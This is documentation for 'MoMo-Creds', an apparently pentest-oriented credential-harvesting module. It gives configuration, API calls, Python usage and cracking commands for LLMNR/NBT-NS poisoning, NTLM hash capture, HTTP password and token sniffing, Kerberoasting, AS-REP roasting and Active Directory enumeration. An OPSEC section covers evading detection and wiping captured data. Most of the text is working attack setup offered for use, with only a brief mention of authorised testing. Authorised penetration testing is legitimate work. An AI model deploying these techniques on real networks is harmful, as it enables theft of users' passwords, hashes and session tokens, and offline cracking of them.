# 🔑 Credential Harvesting Guide

> **MoMo-Creds Module Documentation**  
> Version: 1.0.0 | Added in MoMo v1.6.0

---

## 📖 Table of Contents

- [Overview](#-overview)
- [Quick Start](#-quick-start)
- [Attack Techniques](#-attack-techniques)
  - [Responder (LLMNR/NBT-NS)](#1-responder-llmnrnbt-ns-poisoning)
  - [NTLM Capture](#2-ntlm-hash-capture)
  - [HTTP Sniffing](#3-http-authentication-sniffing)
  - [Kerberoast](#4-kerberoast)
  - [AS-REP Roasting](#5-as-rep-roasting)
  - [LDAP Enumeration](#6-ldap-enumeration)
- [Configuration](#-configuration)
- [API Reference](#-api-reference)
- [OLED Menu](#-oled-menu)
- [Exporting Credentials](#-exporting-credentials)
- [Cracking Captured Hashes](#-cracking-captured-hashes)
- [OPSEC Considerations](#-opsec-considerations)

---

## 🎯 Overview

The **MoMo-Creds** module provides comprehensive credential harvesting capabilities for internal network penetration testing. It combines multiple techniques into a unified, easy-to-use system.

### Capabilities

| Technique | Protocol | Captured Data |
|-----------|----------|---------------|
| **Responder** | LLMNR, NBT-NS, mDNS | Poisoned queries → NTLM hashes |
| **NTLM Capture** | SMB, HTTP | NTLMv1/v2 hashes |
| **HTTP Sniffing** | HTTP | Basic, Digest, Form, Bearer credentials |
| **Kerberoast** | Kerberos | Service tickets (TGS) |
| **AS-REP Roast** | Kerberos | Pre-auth hashes |
| **LDAP Enum** | LDAP | Users, groups, SPNs, delegation |

### Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                     CredsManager                             │
├─────────────────────────────────────────────────────────────┤
│  ┌───────────┐ ┌───────────┐ ┌───────────┐ ┌───────────┐   │
│  │ Responder │ │   NTLM    │ │   HTTP    │ │ Kerberos  │   │
│  │  Server   │ │  Capture  │ │  Sniffer  │ │  Attack   │   │
│  └─────┬─────┘ └─────┬─────┘ └─────┬─────┘ └─────┬─────┘   │
│        │             │             │             │          │
│        └─────────────┴──────┬──────┴─────────────┘          │
│                             │                                │
│                      ┌──────▼──────┐                        │
│                      │  Callback   │                        │
│                      │   Handler   │                        │
│                      └──────┬──────┘                        │
│                             │                                │
├─────────────────────────────┼────────────────────────────────┤
│                      ┌──────▼──────┐                        │
│                      │ Auto Export │                        │
│                      │  (Hashcat)  │                        │
│                      └─────────────┘                        │
└─────────────────────────────────────────────────────────────┘
```

---

## 🚀 Quick Start

### 1. Enable in Configuration

```yaml
# configs/momo.yml
creds:
  enabled: true
  interface: eth0
  output_dir: logs/creds
  auto_export: true
  
  responder:
    enabled: true
    llmnr: true
    nbns: true
```

### 2. Start via CLI

```bash
# Start MoMo with creds plugin
momo run -c configs/momo.yml

# Or enable at runtime via API
curl -X POST http://localhost:8082/api/creds/start \
  -H "Authorization: Bearer $TOKEN"
```

### 3. Monitor via OLED

Navigate to: **Main Menu → 🔑 Creds**

### 4. Export Results

```bash
curl -X POST http://localhost:8082/api/creds/export \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"directory": "/tmp/creds", "format": "hashcat"}'
```

---

## ⚔️ Attack Techniques

### 1. Responder (LLMNR/NBT-NS Poisoning)

**What it does:** Responds to broadcast name resolution queries, redirecting victims to our machine to capture NTLM hashes.

**Protocols:**
| Protocol | Port | Description |
|----------|------|-------------|
| LLMNR | UDP 5355 | Link-Local Multicast Name Resolution |
| NBT-NS | UDP 137 | NetBIOS Name Service |
| mDNS | UDP 5353 | Multicast DNS (disabled by default) |

**How it works:**
```
┌─────────┐                    ┌─────────┐                    ┌─────────┐
│ Victim  │  "Where is WPAD?"  │  MoMo   │   "I'm WPAD!"     │ Victim  │
│ Machine │ ──────────────────▶│ (Creds) │ ──────────────────▶│ Machine │
└─────────┘     Broadcast      └─────────┘     Response       └────┬────┘
                                                                    │
                                                              Connects to MoMo
                                                                    │
                                                              ┌─────▼─────┐
                                                              │ NTLM Auth │
                                                              │ Captured! │
                                                              └───────────┘
```

**Configuration:**
```yaml
creds:
  responder:
    enabled: true
    llmnr: true         # LLMNR poisoning
    nbns: true          # NetBIOS poisoning
    mdns: false         # mDNS (noisy, disable)
```

**Filtering:**
```python
# In code
config = ResponderConfig(
    target_hosts=["192.168.1.50"],      # Only poison these IPs
    ignore_hosts=["192.168.1.1"],       # Never poison these
    target_names=["WPAD", "DC01"],      # Only respond to these names
)
```

---

### 2. NTLM Hash Capture

**What it does:** Runs SMB and HTTP servers that request NTLM authentication, capturing hashes from connecting clients.

**Captured Hash Types:**
| Version | Hashcat Mode | Difficulty |
|---------|--------------|------------|
| NTLMv1 | 5500 | Easy (weak) |
| NTLMv2 | 5600 | Medium |
| NTLMv2-SSP | 5600 | Medium |

**Servers:**
| Protocol | Port | Use Case |
|----------|------|----------|
| SMB | 445 | Windows file share requests |
| HTTP | 80 | Web authentication |

**Configuration:**
```yaml
creds:
  ntlm:
    enabled: true
    smb_port: 445       # SMB capture server
    http_port: 80       # HTTP NTLM server
```

**Hash Format (Hashcat):**
```
# NTLMv2 (mode 5600)
username::domain:challenge:response

# Example
admin::CORP:1122334455667788:aabbccdd...
```

---

### 3. HTTP Authentication Sniffing

**What it does:** Captures credentials from HTTP traffic including Basic auth, Digest auth, form posts, and Bearer tokens.

**Captured Types:**
| Type | Description | Cleartext? |
|------|-------------|:----------:|
| Basic | Base64 encoded user:pass | ✅ Yes |
| Digest | MD5 hash with challenge | ❌ No |
| Form | POST data (username/password fields) | ✅ Yes |
| Bearer | JWT/OAuth tokens | ✅ Yes |
| Cookie | Session cookies | ✅ Yes |

**Configuration:**
```yaml
creds:
  http:
    enabled: true
    ports: [80, 8080, 8000, 8888]
    capture_basic: true       # Authorization: Basic
    capture_digest: true      # Authorization: Digest
    capture_forms: true       # POST form data
    capture_bearer: true      # Authorization: Bearer
    capture_cookies: false    # Session cookies (noisy)
```

**Form Field Detection:**
```yaml
# Automatically detects these field names
username_fields: [user, username, email, login, uid, name, account]
password_fields: [pass, password, passwd, pwd, secret, credential]
```

---

### 4. Kerberoast

**What it does:** Requests service tickets (TGS) for accounts with SPNs, which can be cracked offline to reveal service account passwords.

**Requirements:**
- Valid domain credentials
- Network access to Domain Controller

**Attack Flow:**
```
┌─────────┐    TGT     ┌─────────┐   TGS-REQ   ┌─────────┐
│  MoMo   │ ─────────▶ │   DC    │ ◀────────── │  MoMo   │
│ (Creds) │            │ (KDC)   │             │ (Creds) │
└─────────┘            └────┬────┘             └────┬────┘
                            │                       │
                       TGS-REP                      │
                    (Service Ticket)                │
                            │                       │
                            └───────────────────────┘
                                     │
                              ┌──────▼──────┐
                              │   Hashcat   │
                              │  Cracking   │
                              └─────────────┘
```

**Configuration:**
```yaml
creds:
  kerberos:
    enabled: true
    dc_ip: "192.168.1.10"        # Domain Controller
    domain: "corp.local"          # AD Domain
    username: "user"              # Valid domain user
    password: "password"          # Or use ntlm_hash
    # ntlm_hash: "aabbccdd..."   # Pass-the-Hash
```

**Hashcat Modes:**
| Encryption | Mode | Speed |
|------------|------|-------|
| RC4-HMAC (23) | 13100 | Fast |
| AES-128 (17) | 19600 | Slow |
| AES-256 (18) | 19700 | Very Slow |

**Tip:** Request RC4 encryption for faster cracking:
```yaml
creds:
  kerberos:
    request_rc4: true   # Prefer RC4 over AES
```

---

### 5. AS-REP Roasting

**What it does:** Targets accounts with "Do not require Kerberos preauthentication" enabled, allowing hash capture without valid credentials.

**Requirements:**
- List of usernames to test
- Network access to Domain Controller

**No credentials needed!**

**Hashcat Mode:** 18200

**Usage:**
```python
from momo.infrastructure.creds import ASREPRoast, KerberoastConfig

config = KerberoastConfig(
    dc_ip="192.168.1.10",
    domain="corp.local",
    username="",  # Not needed for AS-REP
)

roast = ASREPRoast(config)
hashes = await roast.run(["user1", "user2", "svc_account"])
```

---

### 6. LDAP Enumeration

**What it does:** Enumerates Active Directory to find high-value targets.

**Discovered Information:**
| Category | Data |
|----------|------|
| Users | Username, email, groups, admin status |
| SPNs | Kerberoastable accounts |
| AS-REP | Accounts without pre-auth |
| Groups | Domain Admins, Enterprise Admins |
| Computers | Delegation settings, OS versions |

**Configuration:**
```yaml
creds:
  kerberos:
    enabled: true
    dc_ip: "192.168.1.10"
    domain: "corp.local"
    username: "user"
    password: "password"
```

**High-Value Groups Detected:**
- Domain Admins
- Enterprise Admins
- Schema Admins
- Backup Operators
- Account Operators
- DnsAdmins

---

## ⚙️ Configuration

### Full Configuration Reference

```yaml
# ═══════════════════════════════════════════════════════════════════
# Credential Harvesting Configuration
# ═══════════════════════════════════════════════════════════════════
creds:
  # General Settings
  enabled: false                    # Master enable switch
  interface: eth0                   # Network interface
  output_dir: logs/creds            # Output directory
  auto_export: true                 # Auto-export on capture
  export_format: hashcat            # hashcat, john, csv
  
  # ─────────────────────────────────────────────────────────────────
  # Responder (LLMNR/NBT-NS Poisoning)
  # ─────────────────────────────────────────────────────────────────
  responder:
    enabled: true
    llmnr: true                     # UDP 5355
    nbns: true                      # UDP 137
    mdns: false                     # UDP 5353 (noisy)
  
  # ─────────────────────────────────────────────────────────────────
  # NTLM Hash Capture
  # ─────────────────────────────────────────────────────────────────
  ntlm:
    enabled: true
    smb_port: 445                   # SMB server port
    http_port: 80                   # HTTP NTLM port
  
  # ─────────────────────────────────────────────────────────────────
  # HTTP Authentication Sniffing
  # ─────────────────────────────────────────────────────────────────
  http:
    enabled: true
    ports: [80, 8080, 8000]         # Ports to monitor
    capture_basic: true             # Basic auth
    capture_digest: true            # Digest auth
    capture_forms: true             # Form POST data
    capture_bearer: true            # Bearer tokens
    capture_cookies: false          # Session cookies
  
  # ─────────────────────────────────────────────────────────────────
  # Kerberos Attacks
  # ─────────────────────────────────────────────────────────────────
  kerberos:
    enabled: false                  # Requires DC access
    dc_ip: ""                       # Domain Controller IP
    domain: ""                      # AD Domain
    username: ""                    # Domain username
    password: ""                    # Password
    ntlm_hash: ""                   # Or NTLM hash for PTH
```

---

## 🌐 API Reference

### Endpoints

| Method | Endpoint | Description |
|--------|----------|-------------|
| GET | `/api/creds/status` | Get harvesting statistics |
| POST | `/api/creds/start` | Start credential harvesting |
| POST | `/api/creds/stop` | Stop harvesting |
| GET | `/api/creds/credentials` | Get all captured credentials |
| GET | `/api/creds/ntlm` | Get NTLM hashes |
| GET | `/api/creds/http` | Get HTTP credentials |
| GET | `/api/creds/kerberos` | Get Kerberos tickets |
| POST | `/api/creds/export` | Export to files |
| DELETE | `/api/creds/clear` | Clear all captured data |

### Examples

**Get Status:**
```bash
curl http://localhost:8082/api/creds/status \
  -H "Authorization: Bearer $TOKEN"
```

Response:
```json
{
  "running": true,
  "uptime_seconds": 3600,
  "total_credentials": 15,
  "ntlm_hashes": 8,
  "http_credentials": 5,
  "poisoned_queries": 23,
  "kerberos_tickets": 2
}
```

**Get NTLM Hashes:**
```bash
curl http://localhost:8082/api/creds/ntlm \
  -H "Authorization: Bearer $TOKEN"
```

Response:
```json
{
  "hashes": [
    {
      "timestamp": "2024-12-24T10:30:00",
      "version": "NTLMv2",
      "username": "admin",
      "domain": "CORP",
      "source_ip": "192.168.1.50",
      "hashcat_format": "admin::CORP:1122334455667788:aabbccdd..."
    }
  ],
  "total": 1,
  "challenge": "1122334455667788"
}
```

**Export Credentials:**
```bash
curl -X POST http://localhost:8082/api/creds/export \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"directory": "/tmp/creds", "format": "hashcat"}'
```

---

## 🖥️ OLED Menu

Navigate to **Main Menu → 🔑 Creds**

```
┌────────────────────────┐
│ 🔑 Creds               │
├────────────────────────┤
│ ☑ Enabled              │
│ ────────────────────── │
│ ▶ Start                │
│ ■ Stop                 │
│ 💾 Export              │
│ ────────────────────── │
│ NTLM: 8                │
│ HTTP: 5                │
│ Poisoned: 23           │
│ Total: 15              │
│ ────────────────────── │
│ ← Back                 │
└────────────────────────┘
```

---

## 💾 Exporting Credentials

### Export Formats

| Format | Extension | Use For |
|--------|-----------|---------|
| Hashcat | `.txt` | GPU cracking with Hashcat |
| John | `.john` | CPU cracking with John the Ripper |
| CSV | `.csv` | Spreadsheet analysis |

### File Structure

```
logs/creds/
├── ntlm_hashes.txt           # Hashcat format
├── ntlm_hashes.john          # John format
├── kerberos_tickets.txt      # Kerberos TGS
├── http_creds.csv            # HTTP credentials
└── export/
    └── 2024-12-24_103000/    # Timestamped exports
        ├── ntlm.txt
        ├── kerberos.txt
        └── http.csv
```

### Hashcat Format Examples

**NTLMv2 (mode 5600):**
```
admin::CORP:1122334455667788:aabbccdd01234567890abcdef01234567:0101000000000000...
```

**Kerberos TGS RC4 (mode 13100):**
```
$krb5tgs$23$*admin$CORP$MSSQLSvc/sql01.corp.local:1433*$aabbccdd...
```

**AS-REP (mode 18200):**
```
$krb5asrep$23$user@CORP.LOCAL:aabbccdd...
```

---

## 💥 Cracking Captured Hashes

### Using Hashcat

```bash
# NTLMv2
hashcat -m 5600 ntlm_hashes.txt wordlist.txt

# Kerberos TGS (RC4)
hashcat -m 13100 kerberos_tickets.txt wordlist.txt

# AS-REP
hashcat -m 18200 asrep_hashes.txt wordlist.txt

# With rules
hashcat -m 5600 ntlm_hashes.txt wordlist.txt -r rules/best64.rule
```

### Using John the Ripper

```bash
# NTLM
john --format=netntlmv2 ntlm_hashes.john

# Kerberos
john --format=krb5tgs kerberos_tickets.john
```

### Cloud Cracking via Nexus

```yaml
# Enable cloud cracking
cracking:
  cloud_enabled: true
  nexus_api_url: "http://nexus.local:8080"
```

Captured hashes automatically sync to Nexus for GPU-accelerated cracking.

---

## 🔒 OPSEC Considerations

### Detection Risks

| Technique | Risk Level | Detection Method |
|-----------|:----------:|------------------|
| Responder | 🟡 Medium | IDS signatures, LLMNR/NBT-NS monitoring |
| NTLM Capture | 🟢 Low | Unusual SMB connections |
| HTTP Sniffing | 🟢 Low | Passive, hard to detect |
| Kerberoast | 🟡 Medium | Unusual TGS requests, event logs |
| LDAP Enum | 🟢 Low | Legitimate LDAP traffic |

### Best Practices

1. **Use Filtering**
   ```yaml
   # Only target specific hosts
   responder:
     target_hosts: ["192.168.1.50", "192.168.1.51"]
     ignore_hosts: ["192.168.1.1"]  # Gateway
   ```

2. **Limit Protocols**
   ```yaml
   # Disable noisy protocols
   responder:
     mdns: false   # Very noisy
   ```

3. **Rate Limiting**
   - Don't poison every query
   - Add delays between Kerberos requests

4. **Clean Up**
   ```bash
   # Clear captured data when done
   curl -X DELETE http://localhost:8082/api/creds/clear
   ```

5. **Secure Storage**
   - Encrypt export files
   - Delete after cracking
   - Don't leave on target network

---

## 📚 Related Documentation

- [OPERATIONS.md](OPERATIONS.md) - Operational guidelines
- [SECURITY.md](SECURITY.md) - Security hardening
- [CRACKING.md](CRACKING.md) - Password cracking guide
- [PLUGINS.md](PLUGINS.md) - Plugin development

---

<p align="center">
  <strong>Part of the 🔥 MoMo Ecosystem</strong>
</p>

